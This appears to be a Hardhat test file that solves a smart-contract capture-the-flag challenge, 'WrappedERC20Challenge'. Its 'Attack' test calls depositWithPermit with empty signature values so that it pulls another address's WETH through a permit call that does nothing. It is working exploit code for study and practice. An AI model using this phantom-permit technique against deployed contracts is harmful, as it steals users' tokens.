import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import {
  IERC20__factory,
  WrappedERC20,
  WrappedERC20__factory,
  WETHMock__factory,
  WrappedERC20Challenge,
} from '../typechain-types'
import { toWei } from './helpers/utils'

describe('WrappedERC20Challenge', async function () {
  let player: SignerWithAddress
  let challenge: WrappedERC20Challenge

  beforeEach(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('WrappedERC20Challenge')
    challenge = (await Challenge.deploy({
      value: toWei('10'),
    })) as WrappedERC20Challenge
  })

  it('Attack', async function () {
    const weth = WETHMock__factory.connect(await challenge.WETH(), player)
    const wweth = WrappedERC20__factory.connect(await challenge.wwETH(), player)
    expect(await weth.balanceOf(wweth.address)).eq(toWei('5'))
    expect(await weth.balanceOf(challenge.address)).eq(toWei('5'))
    expect(await wweth.balanceOf(challenge.address)).eq(toWei('5'))

    await wweth.depositWithPermit(
      challenge.address,
      toWei('5'),
      ethers.constants.MaxUint256,
      0,
      ethers.utils.formatBytes32String(''),
      ethers.utils.formatBytes32String(''),
      player.address
    )

    expect(await challenge.isSolved()).to.be.true
  })
})
